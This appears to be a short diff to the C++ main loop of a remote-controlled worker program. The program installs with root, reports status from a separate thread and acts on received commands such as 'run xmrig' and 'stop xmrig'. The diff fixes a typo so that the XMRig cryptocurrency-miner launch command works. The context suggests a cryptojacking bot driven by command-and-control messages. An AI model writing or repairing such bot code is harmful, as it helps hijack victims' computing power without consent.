@@ -20,7 +20,7 @@ int main()
         worker.install("root");
 
     std::thread status_thread(send_status, &worker);
-
+    
     std::vector<std::string> msgs;
     while (true)
     {
@@ -43,7 +43,7 @@ int main()
             }
             else if (msgs[1] == "run xmrig")
             {
-                worker.runXmrix();
+                worker.runXmrig();
             }
             else if (msgs[1] == "stop xmrig")
             {
